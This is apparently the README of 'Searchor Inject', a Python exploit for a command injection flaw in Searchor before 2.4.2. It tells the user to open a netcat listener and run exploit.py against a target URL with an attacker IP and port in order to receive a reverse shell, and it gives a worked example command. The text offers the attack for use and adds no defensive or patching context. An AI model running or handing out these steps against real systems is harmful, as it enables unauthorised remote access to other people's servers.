Searchor Inject is a simple python3 script developed to exploit the command injection vulnerability found in Searchor < 2.4.2.

This script was developed by v0rt3chs and was inspired by the bash script created by nikn0laty found here: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

To use Searchor Inject, ensure that you have python3 installed. Then create a listener for your reverse shell. I use netcat:

nc -nvlp 1337



Then use the exploit.py script to run the exploit and receive a reverse shell:

python3 exploit.py <http://target.url/> <LHOST> <LPORT>

EX:
python3 exploit.py http://vulnerable-site.url/search 10.10.10.10 1337
